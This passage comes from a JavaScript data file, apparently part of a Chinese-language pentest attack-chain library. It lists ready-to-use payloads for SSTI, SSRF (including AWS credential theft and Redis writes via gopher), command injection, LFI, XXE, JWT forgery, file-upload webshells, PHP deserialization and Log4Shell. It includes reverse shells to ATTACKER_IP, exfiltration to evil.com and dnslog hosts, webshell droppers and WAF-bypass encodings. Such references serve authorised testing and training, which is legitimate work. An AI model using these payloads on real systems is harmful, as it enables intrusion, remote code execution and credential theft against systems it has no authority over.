        { technique: 'SpEL 编码', desc: '对关键字进行编码绕过 SpEL 沙箱检查', cmds: ['__${T(java.lang.Runtime).getRuntime().exec("id".charAt(0)+"d")}__::.x', '__${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105)+T(java.lang.Character).toString(100))}__::.x'] }
      ]
    },
    {
      id: 'ssti-pug-01', cat: 'ssti', sub: 'Pug/Jade',
      title: 'Pug/Jade (Node.js) SSTI → RCE 完整链',
      steps: [
        { title: '1. 探测 Pug', cmd: '#{7*7}', desc: '返回 49 确认为 Pug/Jade 模板' },
        { title: '2. child_process RCE', cmd: '#{global.process.mainModule.require("child_process").execSync("id").toString()}', desc: '通过 child_process.execSync 执行命令并同步获取输出' },
        { title: '3. 异步 RCE', cmd: '#{global.process.mainModule.require("child_process").exec("curl http://ATTACKER.com/$(whoami)")}', desc: '异步执行命令通过外带获取结果 (用于 execSync 被阻断)' },
        { title: '4. 反弹 Shell', cmd: "-#{global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"')}", desc: '反弹 shell (使用行注释 - 前缀)' },
        { title: '5. 文件读取', cmd: '#{global.process.mainModule.require("fs").readFileSync("/etc/passwd","utf-8")}', desc: 'Node.js fs 模块读取文件' }
      ],
      bypass: [
        { technique: 'this 替代 global', desc: '当 global 被屏蔽时使用 this', cmds: ['#{this.process.mainModule.require("child_process").execSync("id").toString()}'] }
      ]
    },
    {
      id: 'ssti-mako-01', cat: 'ssti', sub: 'Mako',
      title: 'Mako (Python) SSTI → RCE 完整链',
      steps: [
        { title: '1. 探测 Mako', cmd: '${7*7}', desc: 'Mako 使用 ${} 语法，返回 49 (和 FreeMarker 相同)' },
        { title: '2. os.popen RCE', cmd: '${self.module.cache.util.os.popen("id").read()}', desc: '通过模板缓存对象访问 os 模块执行命令' },
        { title: '3. 免引号 RCE', cmd: '${self.module.cache.util.os.popen(str().join(chr(i) for i in [105,100])).read()}', desc: '使用 chr() 拼接 ASCII 码构造命令字符串 "id"，免引号' },
        { title: '4. import 方式 RCE', cmd: '<%\nimport os\nx=os.popen("id").read()\n%>${x}', desc: '使用 <% %> 代码块导入模块执行命令' },
        { title: '5. __import__ 绕过', cmd: '${self.module.cache.util.__builtins__.__import__("os").popen("id").read()}', desc: '通过 __builtins__ 动态导入 os 模块' }
      ],
      bypass: [
        { technique: '命名空间遍历', desc: '通过多种路径访问最终执行', cmds: ['${self.cache.util.os.system("id")}', '${self.module.template.module.cache.util.os.popen("id").read()}'] }
      ]
    },

    // ── SSRF ──
    {
      id: 'ssrf-aws-01', cat: 'ssrf', sub: '云元数据',
      title: 'AWS EC2 元数据窃取完整链',
      steps: [
        { title: '1. 确认 SSRF 漏洞', cmd: 'http://127.0.0.1:80/', desc: '请求本地端口，验证服务端是否发起回连' },
        { title: '2. 探测元数据端点', cmd: 'http://169.254.169.254/', desc: '请求 AWS 链路本地地址 (169.254.169.254)' },
        { title: '3. 枚举元数据版本', cmd: 'http://169.254.169.254/latest/meta-data/', desc: '获取可用元数据 key 列表' },
        { title: '4. 获取 IAM 凭证', cmd: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: '查看可用的 IAM 角色名' },
        { title: '5. 窃取临时密钥', cmd: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>', desc: '获取 AWS_ACCESS_KEY_ID, SECRET_ACCESS_KEY, TOKEN' }
      ],
      bypass: [
        { technique: 'IP 进制转换', desc: '使用八进制/十进制/十六进制 IP 绕过 hostname 黑名单', cmds: ['http://0177.0.0.1/', 'http://2130706433/', 'http://0x7f000001/'] },
        { technique: 'DNS 重绑定', desc: '利用短 TTL DNS 绕过同源检查', cmds: ['http://127.0.0.1.nip.io/', 'http://1.1.1.1@evil.com/admin'] },
        { technique: 'URL 跳转', desc: '利用开放重定向绕过 SSRF 白名单', cmds: ['http://trusted.com/redirect?url=http://169.254.169.254/', 'http://trusted.com@evil.com/admin'] }
      ]
    },
    {
      id: 'ssrf-redis-01', cat: 'ssrf', sub: 'URL',
      title: 'SSRF → 内网 Redis 未授权利用链',
      steps: [
        { title: '1. 探测 Redis 存活', cmd: 'dict://127.0.0.1:6379/info', desc: '使用 dict 协议探测 Redis 服务信息' },
        { title: '2. 写入 SSH Key', cmd: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a<SSH_PUBKEY>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a', desc: '通过 gopher 协议写入 authorized_keys，SSH 免密登录' },
        { title: '3. 写入 Crontab', cmd: 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$62%0d%0a* * * * * /bin/bash -c "exec /bin/bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1"%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a', desc: '写入 crontab 计划任务实现反弹 Shell' },
        { title: '4. 写入 Webshell', cmd: 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ashell%0d%0a$28%0d%0a<?php system($_GET["cmd"]); ?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a', desc: '向 Web 目录写入 PHP Webshell' }
      ],
      bypass: [
        { technique: '协议攻击', desc: '使用其他 RFC 协议 (dict, ftp, sftp) 探测内网', cmds: ['dict://127.0.0.1:6379/config:set:dir:/var/www/html', 'sftp://evil.com:11111/'] },
        { technique: 'CRLF 注入', desc: 'HTTP 请求走私 / CRLF 注入方式', cmds: ['http://127.0.0.1:6379/%0D%0ASET%20x%20test%0D%0A', 'http://127.0.0.1:6379/%0D%0A*1%0D%0A$4%0D%0Ainfo%0D%0A'] }
      ]
    },

    // ── 命令注入 ──
    {
      id: 'cmdi-shell-01', cat: 'cmdi', sub: 'Unix',
      title: 'Linux 命令注入 → 反弹 Shell 完整链',
      steps: [
        { title: '1. 探测注入点', cmd: '; id', desc: '分号链式注入，返回 uid/gid 说明存在注入' },
        { title: '2. 确认可执行', cmd: '| /usr/bin/id', desc: '管道符注入，绝对路径执行命令' },
        { title: '3. 环境探测', cmd: '; uname -a; cat /etc/os-release', desc: '获取系统类型和版本信息' },
        { title: '4. 检查防火墙', cmd: '; which nc; which bash; which python3', desc: '确认可用工具 (nc / bash / python)' },
        { title: '5. Bash 反弹 Shell', cmd: '; bash -c "exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1"', desc: '经典 Bash TCP 反弹 Shell' },
        { title: '6. Python 反弹 Shell', cmd: '; python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', desc: 'Bash 不可用时使用 Python 反弹' }
      ],
      bypass: [
        { technique: '命令分隔符替代', desc: '使用多种分隔符绕过空格/分号过滤', cmds: ['%0Aid', '`id`', '$(id)', '&id&', '||id||'] },
        { technique: '引号混淆', desc: '用引号分隔命令名，shell 会自动拼接', cmds: ["c'a't /etc/passwd", 'c"a"t /etc/passwd', 'c\\a\\t /etc/passwd'] },
        { technique: '通配符替代', desc: '使用 ? 和 * 匹配命令名', cmds: ['/???/?at /etc/passwd', '/bin/c?t /etc/???swd'] },
        { technique: 'IFS 变量', desc: '利用 $IFS 环境变量替代空格', cmds: ['cat${IFS}/etc/passwd', 'cat${IFS%??}/etc/passwd'] }
      ]
    },
    {
      id: 'cmdi-exfil-01', cat: 'cmdi', sub: '绕过',
      title: '盲命令注入 → DNS/HTTP 外带数据链',
      steps: [
        { title: '1. 确认盲注入', cmd: '; sleep 5', desc: '时间延迟确认命令是否被执行' },
        { title: '2. DNS 外带测试', cmd: '; nslookup $(whoami).ATTACKER.dnslog.cn', desc: '通过 DNS 请求将命令输出外带到可控 DNS 服务器' },
        { title: '3. HTTP 外带', cmd: '; curl http://ATTACKER_IP:8080/?d=$(id|base64)', desc: 'Base64 编码命令输出通过 HTTP 请求外带' },
        { title: '4. 逐字节外带 (Blind)', cmd: '; if [ $(cat /etc/passwd|cut -c1) = "r" ]; then sleep 3; fi', desc: '盲注入场景逐字符比对 + 时间延迟外带' },
        { title: '5. 反弹 Shell', cmd: '; wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh && bash /tmp/s.sh', desc: '下载远程脚本执行反弹 Shell' }
      ],
      bypass: [
        { technique: '编码外带', desc: 'Base64/Hex/URL 编码绕过外带内容检测', cmds: ['; curl http://evil.com/$(cat /etc/passwd|base64 -w0)', '; wget http://evil.com/$(id|xxd -p|tr -d "\\n")'] },
        { technique: '协议替代', desc: '使用 wget/nc 替代 curl', cmds: ['; wget --post-data=$(id) http://evil.com', '; nc evil.com 8080 < /etc/passwd'] },
        { technique: '无空格绕过', desc: '用重定向和变量绕过空格过滤', cmds: [';{cat,/etc/passwd}>/dev/tcp/evil.com/8080', ';curl$IFS$9evil.com?d=$(id)'] }
      ]
    },

    // ── LFI ──
    {
      id: 'lfi-rce-01', cat: 'lfi', sub: '日志投毒',
      title: 'LFI 日志投毒 → RCE 完整链',
      steps: [
        { title: '1. 确认 LFI', cmd: '../../../../../../etc/passwd', desc: '读取 /etc/passwd 确认存在文件包含漏洞' },
        { title: '2. 识别日志路径', cmd: '../../../../../../var/log/apache2/access.log', desc: '读取 Apache 访问日志确认路径可达' },
        { title: '3. 投毒 User-Agent', cmd: "User-Agent: <?php system($_GET['cmd']); ?>", desc: '在请求头中携带 PHP 代码，写入日志' },
        { title: '4. 触发 RCE', cmd: '<LOG_PATH>?cmd=id', desc: '再次 LFI 包含日志文件 + 传参触发代码执行' },
        { title: '5. 获取 Webshell', cmd: "User-Agent: <?php file_put_contents('shell.php','<?php system($_GET[\"cmd\"]);?>'); ?>", desc: '投毒写入持久化 Webshell' },
        { title: '6. nginx 日志路径', cmd: '../../../../../../var/log/nginx/access.log', desc: '针对 Nginx 服务器的日志路径' }
      ],
      bypass: [
        { technique: 'procfs 日志', desc: '当标准日志路径不可达时使用 /proc/self/fd', cmds: ['/proc/self/fd/0', '/proc/self/fd/2', '/proc/self/environ'] },
        { technique: '邮件日志投毒', desc: '通过 SMTP 发送带 Payload 的邮件投毒 /var/mail', cmds: ['/var/mail/www-data', '/var/spool/mail/www-data'] }
      ]
    },
    {
      id: 'lfi-wrapper-01', cat: 'lfi', sub: 'WRAPPER',
      title: 'PHP Wrapper → 源码泄露 → RCE 链',
      steps: [
        { title: '1. 读取源码 (B64)', cmd: 'php://filter/convert.base64-encode/resource=index.php', desc: '用 Base64 过滤器编码读取 PHP 源码解码' },
        { title: '2. 读取源码 (rot13)', cmd: 'php://filter/read=string.rot13/resource=config.php', desc: '用 rot13 过滤器读取配置文件 (绕过关键词过滤)' },
        { title: '3. 读取无后缀文件', cmd: 'php://filter/convert.base64-encode/resource=/etc/passwd', desc: '同样可读取系统文件' },
        { title: '4. 命令执行 (expect)', cmd: 'expect://id', desc: '当 expect 扩展安装时，通过 expect:// 执行系统命令' },
        { title: '5. 代码执行 (data)', cmd: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', desc: '通过 data:// 伪协议直接执行 Base64 编码的 PHP 代码' },
        { title: '6. Phar 反序列化', cmd: 'phar://uploaded_file.jpg/shell.php', desc: '上传恶意 Phar 文件后通过 phar:// 触发反序列化' }
      ],
      bypass: [
        { technique: '编码链', desc: '组合多种编码绕过字符过滤', cmds: ['php://filter/write=convert.base64-decode/resource=shell.php', 'php://filter/convert.iconv.utf-8.utf-16/resource=index.php'] }
      ]
    },

    // ── 路径遍历 ──
    {
      id: 'trav-01', cat: 'traversal', sub: 'Unix',
      title: '路径遍历 → 敏感文件读取攻击链',
      steps: [
        { title: '1. 基础遍历', cmd: '../../../etc/passwd', desc: '经典 ../ 路径回溯读取 /etc/passwd' },
        { title: '2. 深度回溯', cmd: '../../../../../../../../etc/passwd', desc: '超长回溯路径确保到达文件系统根目录' },
        { title: '3. 读取应用配置', cmd: '../../../WEB-INF/web.xml', desc: '读取 Java Web 应用核心配置' },
        { title: '4. 读取源码', cmd: '../../../WEB-INF/classes/application.properties', desc: '读取 Spring Boot 配置文件 (含数据库密码)' },
        { title: '5. 读取 SSH 密钥', cmd: '../../../.ssh/id_rsa', desc: '读取 SSH 私钥，如果存在可远程登录' },
        { title: '6. Windows 路径', cmd: '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts', desc: 'Windows 系统反斜杠路径遍历' }
      ],
      bypass: [
        { technique: '编码绕过', desc: 'URL/Unicode 编码 ../ 序列', cmds: ['..%2f..%2f..%2fetc/passwd', '%2e%2e/%2e%2e/%2e%2e/etc/passwd', '..%252f..%252f..%252fetc/passwd'] },
        { technique: '路径规范化', desc: '利用 ....// 组合在过滤后还原为 ../', cmds: ['....//....//....//etc/passwd', '..;//..;//..;//etc/passwd'] },
        { technique: 'Null Byte', desc: '%00 截断文件后缀 (PHP < 5.3.4)', cmds: ['../../../etc/passwd%00.html', '../../../etc/passwd%00'] }
      ]
    },

    // ── XXE ──
    {
      id: 'xxe-oob-01', cat: 'xxe', sub: 'OOB',
      title: 'XXE OOB 数据外带完整攻击链',
      steps: [
        { title: '1. 探测 XXE', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_TEST">]><foo>&xxe;</foo>', desc: '基础 XXE 测试，确认外部实体是否解析' },
        { title: '2. 文件读取', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: '通过 file:// 协议读取本地文件' },
        { title: '3. OOB 外带 (1)', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>&exfil;</foo>', desc: '加载外部 DTD 文件实现 Out-of-Band 数据外带' },
        { title: '4. OOB DTD 文件', cmd: '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?%file;\'>">%eval;%exfil;', desc: '外部 DTD 文件内容，读取文件并通过 HTTP 请求传递给攻击者' },
        { title: '5. SOAP XXE', cmd: '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><xxx/>]]></foo></soap:Body>', desc: '在 SOAP 接口中通过 CDATA 触发 XXE' }
      ],
      bypass: [
        { technique: '参数实体', desc: '使用参数实体 (%xxe;) 绕过一般实体限制', cmds: ['<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % call "<!ENTITY xxe SYSTEM \'http://evil.com/?%xxe;\'>">%call;'] }
      ]
    },

    // ── XXE 经典 ──
    {
      id: 'xxe-classic-01', cat: 'xxe', sub: '文件读取',
      title: 'Classic In-Band XXE 文件读取完整链',
      steps: [
        { title: '1. 基础探测', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_TEST">]><foo>&xxe;</foo>', desc: '确认外部实体是否解析，返回 XXE_TEST 则存在' },
        { title: '2. Linux 文件读取', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: '读取 /etc/passwd (使用 file:// 协议)' },
        { title: '3. Windows 文件读取', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', desc: '读取 Windows 系统文件' },
        { title: '4. PHP Base64 编码读取', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', desc: 'Base64 编码读取 PHP 源码，解码还原' },
        { title: '5. 目录列表', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]><foo>&xxe;</foo>', desc: '列目录 (部分解析器支持)，获取更多文件路径' },
        { title: '6. SSRF 攻击', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', desc: '通过 XXE 请求 AWS 元数据端点' },
        { title: '7. expect:// RCE', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', desc: 'PHP expect 封装器执行命令 (需 PECL expect 扩展)' },
        { title: '8. 内网端口扫描', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22/">]><foo>&xxe;</foo>', desc: '通过响应时间/错误差异探测内网开放端口' }
      ],
      bypass: [
        { technique: 'UTF-16 编码', desc: 'XML 声明中使用 UTF-16 绕过 WAF 对 UTF-8 的检查', cmds: ['<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'] },
        { technique: 'XML 拼接', desc: '双 XML 声明 / 空格前缀绕过 WAF', cmds: ['<?xml version="1.0"?><?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo><!--'] }
      ]
    },
    {
      id: 'xxe-xinclude-01', cat: 'xxe', sub: 'XInclude',
      title: 'XInclude 注入（无 DOCTYPE 控制时）',
      steps: [
        { title: '1. 基础文件读取', cmd: '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>', desc: '无 DOCTYPE 时注入 XInclude 读取文件，插入到用户可控的 XML 子元素中' },
        { title: '2. PHP Base64 编码', cmd: '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="php://filter/convert.base64-encode/resource=/etc/passwd"/>', desc: '通过 PHP 过滤器 Base64 编码读取文件' },
        { title: '3. SSRF 攻击', cmd: '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="http://169.254.169.254/latest/meta-data/"/>', desc: 'XInclude 发起 SSRF 请求云元数据' },
        { title: '4. 多文件读取', cmd: '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/><xi:include parse="text" href="file:///etc/hosts"/></root>', desc: '在一个 XML 文档中包含多个文件' },
        { title: '5. 编码绕过', cmd: '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" encoding="UTF-8" parse="text" href="file:///etc/passwd"/>', desc: '明确指定编码绕过过滤' }
      ],
      bypass: [
        { technique: '命名空间混淆', desc: '使用不同命名空间前缀绕过关键字检测', cmds: ['<x:include xmlns:x="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>', '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'] }
      ]
    },
    {
      id: 'xxe-error-01', cat: 'xxe', sub: '报错型',
      title: 'Error-Based XXE 报错泄露文件内容',
      steps: [
        { title: '1. 外部 DTD 文件', cmd: '<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">\n%eval;\n%error;', desc: '攻击者服务器上的 evil.dtd 文件内容' },
        { title: '2. 目标请求外部 DTD', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd">%xxe;]><root>test</root>', desc: '目标解析器加载外部 DTD 触发报错泄露' },
        { title: '3. 本地 DTD 利用', cmd: '<!DOCTYPE foo [\n<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">\n<!ENTITY % ISOamsa \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;">">&#x25;eval;&#x25;error;\'>\n%local_dtd;\n]>', desc: '利用系统自带 DTD 文件，无需外部服务器' },
        { title: '4. 常见本地 DTD 路径', cmd: 'file:///usr/share/yelp/dtd/docbookx.dtd\nfile:///usr/share/xml/fontconfig/fonts.dtd\nfile:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\nfile:///usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd', desc: '常见 Linux 系统的本地 DTD 文件路径' }
      ],
      bypass: [
        { technique: 'DTD 重定义', desc: '在外部 DTD 中覆盖实体名逃避检测', cmds: ['<!ENTITY % a "<!ENTITY &#x25; b SYSTEM \'file:///etc/passwd\'>"><!ENTITY % c "<!ENTITY &#x25; d SYSTEM \'http://evil.com/?%b;\'>">%a;%c;%d;'] }
      ]
    },
    {
      id: 'xxe-cdata-01', cat: 'xxe', sub: 'CDATA',
      title: 'CDATA 包装绕过特殊字符限制',
      steps: [
        { title: '1. CDATA 外带 DTD', cmd: '<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % start "<![CDATA[">\n<!ENTITY % end "]]>">\n<!ENTITY % wrap "<!ENTITY all \'%start;%file;%end;\'>">', desc: '外部 DTD 文件，用 CDATA 包装防止特殊字符破坏 XML' },
        { title: '2. 目标 Payload', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER.com/cdata.dtd">%dtd;%wrap;]><root>&all;</root>', desc: '通过外部 DTD 实现 CDATA 包装读取' },
        { title: '3. 内联 CDATA', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY all "%start;%file;%end;">]><root>&all;</root>', desc: '直接内联 CDATA (PHP 等部分解析器支持)' },
        { title: '4. 读取二进制/含特殊字符文件', cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><elem><![CDATA[&xxe;]]></elem>', desc: '直接用 CDATA 包裹实体引用，避免 & < > " 特殊字符出错' }
      ],
      bypass: [
        { technique: 'UTF-7 BOM', desc: 'BOM 字符 + UTF-7 编码绕过 WAF', cmds: ['\xef\xbb\xbf<?xml version="1.0" encoding="UTF-7"?>+ADw-+ACE-DOCTYPE foo +AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-'] }
      ]
    },

    // ── JWT ──
    {
      id: 'jwt-alg-01', cat: 'jwt', sub: '算法',
      title: 'JWT 算法混淆 → 权限提升攻击链',
      steps: [
        { title: '1. 解码 JWT', cmd: 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...', desc: 'Base64 解码 Header 查看算法类型 (RS256/HS256/none)' },
        { title: '2. alg:none 攻击', cmd: '{"alg":"none","typ":"JWT"}.{"user":"admin","iat":1516239022}.', desc: '将算法改为 none，签名部分留空，绕过验证' },
        { title: '3. HS256 密钥混淆', cmd: '{"alg":"HS256","typ":"JWT"} → 使用公钥作为 HMAC 密钥签名', desc: '当服务端用公钥做 HMAC 密钥时，用已知公钥伪造签名' },
        { title: '4. kid 路径遍历', cmd: '{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}', desc: 'kid 参数注入路径遍历选择已知密钥 (/dev/null = 空字节)' },
        { title: '5. kid SQL 注入', cmd: '{"alg":"HS256","kid":"aaaa\' UNION SELECT \'secret\'--","typ":"JWT"}', desc: '当 kid 用于数据库查询密钥时的 SQL 注入获取可控密钥' },
        { title: '6. jku 伪造', cmd: '{"alg":"RS256","jku":"http://evil.com/jwks.json","kid":"xxx"}', desc: 'jku 指向攻击者可控的 JWKS 端点，服务端使用伪造公钥验签' }
      ],
      bypass: []
    },

    // ── 文件上传 ──
    {
      id: 'upload-ws-01', cat: 'upload', sub: '内容',
      title: '文件上传 → WebShell 获取完整链',
      steps: [
        { title: '1. 上传 PHP Shell', cmd: '<?php system($_GET["cmd"]); ?>', desc: '最简 PHP 一句话 Webshell' },
        { title: '2. 图片马 (GIF)', cmd: 'GIF89a;<?php system($_GET["cmd"]);?>', desc: '在 GIF 文件头后追加 PHP 代码绕过内容检测' },
        { title: '3. 图片马 (PNG)', cmd: '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]);?>', desc: 'PNG 文件头 + PHP 代码' },
        { title: '4. .htaccess + jpg', cmd: 'AddType application/x-httpd-php .jpg', desc: '上传 .htaccess 文件使 jpg 被解析为 PHP' },
        { title: '5. 获取命令执行', cmd: 'GET /uploads/shell.jpg?cmd=id', desc: '访问图片马路径 + 传参触发命令执行' },
        { title: '6. 权限维持', cmd: "<?php file_put_contents('/var/www/html/shell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=')); ?>", desc: '通过低权限 Shell 写入更隐蔽的后门' }
      ],
      bypass: [
        { technique: '扩展名绕过', desc: '利用多重扩展名和特殊字符', cmds: ['shell.php5', 'shell.phtml', 'shell.pHp', 'shell.php.jpg', 'shell.php%00.jpg', 'shell.php%0d%0a.jpg', 'shell.php;.jpg'] },
        { technique: 'MIME 伪造', desc: '修改 Content-Type 头部绕过 MIME 检查', cmds: ['Content-Type: image/jpeg (内容为 PHP)', 'Content-Type: image/gif → GIF89a;<?php ...'] }
      ]
    },
    {
      id: 'upload-bypass-01', cat: 'upload', sub: '扩展名',
      title: '文件上传限制多重绕过链',
      steps: [
        { title: '1. 尝试直接上传', cmd: 'webshell.php', desc: '直接上传 .php 文件，测试是否有限制' },
        { title: '2. 后缀大小写', cmd: 'webshell.pHp', desc: '大小写混合绕过区分大小写的后缀检测' },
        { title: '3. 双扩展名', cmd: 'webshell.php.jpg', desc: 'Apache 解析漏洞：不认识 .jpg → 向前解析 .php' },
        { title: '4. %00 截断', cmd: 'webshell.php%00.jpg', desc: 'Null 字节截断文件路径 (旧版本 PHP/IIS)' },
        { title: '5. 换行截断', cmd: 'webshell.php%0d%0a.jpg', desc: 'CRLF 注入绕过后缀检查' },
        { title: '6. 语义混淆', cmd: 'webshell.asp;.jpg', desc: 'IIS 解析漏洞：; 后的内容被忽略' }
      ],
      bypass: [
        { technique: 'NTFS 流', cmd: 'webshell.php::$DATA', desc: 'Windows NTFS 备用数据流写入 .php 文件', cmds: ['webshell.php::$DATA', 'webshell.php:.jpg'] },
        { technique: '配置文件', cmd: '.htaccess / web.config', desc: '上传服务器配置文件覆盖解析规则', cmds: ['.htaccess: AddType application/x-httpd-php .txt', 'web.config: <handlers><add name="PHP" path="*.jpg" ...'] }
      ]
    },

    // ── 反序列化 ──
    {
      id: 'deser-php-01', cat: 'deser', sub: 'PHP',
      title: 'PHP 反序列化 → RCE 利用链',
      steps: [
        { title: '1. 确认序列化格式', cmd: 'O:8:"MyClass":1:{s:4:"name";s:4:"test";}', desc: '识别 PHP 序列化字符串格式 (O:类名长度:...)' },
        { title: '2. 寻找魔术方法', cmd: '__destruct() / __wakeup() / __toString()', desc: '检查应用代码中是否存在可利用的魔术方法' },
        { title: '3. 构造 Gadget', cmd: 'O:14:"SplObjectStorage":1:{s:4:"test";N;}', desc: '使用 PHPGGC / 自定义 Gadget Chain 生成 Payload' },
        { title: '4. 注入 Payload', cmd: 'curl -d "data=O:8:..." http://target.com/page', desc: '通过 POST/Cookie/Session 传递序列化 Payload' },
        { title: '5. 使用 phpggc', cmd: 'phpggc -b Guzzle/FW1 system id', desc: '用 phpggc 工具生成标准 Gadget Chain' }
      ],
      bypass: []
    },

    // ── Log4j / Log4Shell ──
    {
      id: 'log4j-01', cat: 'log4j', sub: 'JNDI注入',
      title: 'Log4Shell (CVE-2021-44228) RCE 利用链',
      steps: [
        { title: '1. DNS 探测', cmd: '${jndi:ldap://ATTACKER.dnslog.cn/test}', desc: '注入 JNDI LDAP 回调，观察 DNS 日志确认漏洞存在' },
        { title: '2. 环境变量外带', cmd: '${jndi:ldap://${env:USER}.ATTACKER.dnslog.cn}', desc: '通过 JNDI 外带环境变量 (USER/HOSTNAME/JAVA_VERSION)' },
        { title: '3. 版本探测', cmd: '${jndi:ldap://${sys:java.version}.ATTACKER.dnslog.cn}', desc: '外带 Java 版本信息' },
        { title: '4. JNDI RCE', cmd: '${jndi:ldap://ATTACKER_IP:1389/Basic/Command/Base64/d2hvYW1p}', desc: 'JNDIExploit 执行命令 (Base64 编码 whoami)' },
        { title: '5. 反弹 Shell', cmd: '${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/4444}', desc: 'JNDIExploit 反弹 Shell' },
